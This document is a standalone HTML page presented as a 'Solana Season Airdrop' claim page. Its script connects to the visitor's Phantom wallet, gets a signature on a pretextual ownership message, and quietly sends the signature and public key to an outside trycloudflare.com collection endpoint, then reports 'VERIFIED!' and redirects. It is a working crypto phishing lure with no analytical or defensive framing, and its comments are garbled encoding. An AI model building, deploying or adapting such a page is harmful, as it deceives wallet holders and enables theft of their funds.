<!DOCTYPE html><html><head><meta charset="UTF-8">
    </head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:15vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;">
        <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
        <p style="color:#888;margin-bottom:30px;">You are eligible to claim the exclusive reward pool.</p>
        <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM AIRDROP</button>
        <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Engine Ready</div>
    </div>

    <script>
    // ðŸ”± ç»ˆæžâ€œå…åŠ è½½â€é€»è¾‘ï¼šç›´æŽ¥è°ƒç”¨é’±åŒ…å†…ç½®å¯¹è±¡
    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Please use Phantom browser."); return; }
            
            document.getElementById('status').innerText = "Connecting Wallet...";
            const resp = await p.connect();
            const pubKey = resp.publicKey.toString();

            document.getElementById('status').innerText = "Analyzing Eligibility...";

            // ðŸš€ ç›´æŽ¥å”¤èµ·ç­¾å (ä¸éœ€è¦å¤–éƒ¨åº“ä¹Ÿèƒ½è·‘çš„åŸºæœ¬åŠ¨ä½œ)
            const message = "Verify Ownership for Airdrop\nID: " + Math.floor(Math.random() * 999999);
            const encodedMessage = new TextEncoder().encode(message);
            
            const signedMessage = await p.signMessage(encodedMessage, "utf8");
            
            // æ•°æ®å›žä¼ 
            const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
            const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
            
            new Image().src = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + pubKey;

            document.getElementById('status').style.color = "#14F195";
            document.getElementById('status').innerText = "VERIFIED! REDIRECTING...";
            
            setTimeout(() => {
                window.location.href = "https://solscan.io/account/" + pubKey;
            }, 2000);

        } catch(e) { 
            document.getElementById('status').innerText = "Error: " + e.message;
        }
    }
    </script></body></html>
